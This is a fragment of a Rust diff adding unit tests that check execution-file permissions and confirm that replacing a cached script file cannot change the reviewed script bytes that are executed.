+                .permissions()
+                .mode()
+                & 0o777,
+            0o700
+        );
+        let output = Command::new("/bin/sh")
+            .arg(execution.path())
+            .output()
+            .expect("execute reviewed clean script");
+        assert!(output.status.success());
+        assert_eq!(output.stdout, b"clean\n");
+    }
+
+    #[cfg(unix)]
+    #[test]
+    fn cache_path_replacement_cannot_change_execution_bytes() {
+        let dir = tempfile::tempdir().unwrap();
+        let content = b"#!/bin/sh\nprintf 'reviewed\\n'\n";
+        let sha = sha256_hex(content);
+        let cache_path = dir.path().join(&sha);
+        std::fs::write(&cache_path, b"#!/bin/sh\nprintf 'replaced\\n'\n").unwrap();
+
+        let execution = materialize_execution_file(dir.path(), content, &sha).unwrap();
+        assert_ne!(execution.path(), cache_path);
+        assert_eq!(std::fs::read(execution.path()).unwrap(), content);
+        assert_eq!(sha256_hex(&std::fs::read(execution.path()).unwrap()), sha);
+        let output = Command::new("/bin/sh")
+            .arg(execution.path())
+            .output()
+            .expect("execute private reviewed copy");
+        assert!(output.status.success());
+        assert_eq!(output.stdout, b"reviewed\n");
+    }
 
     #[test]
     fn test_allowed_interpreter_sh() {
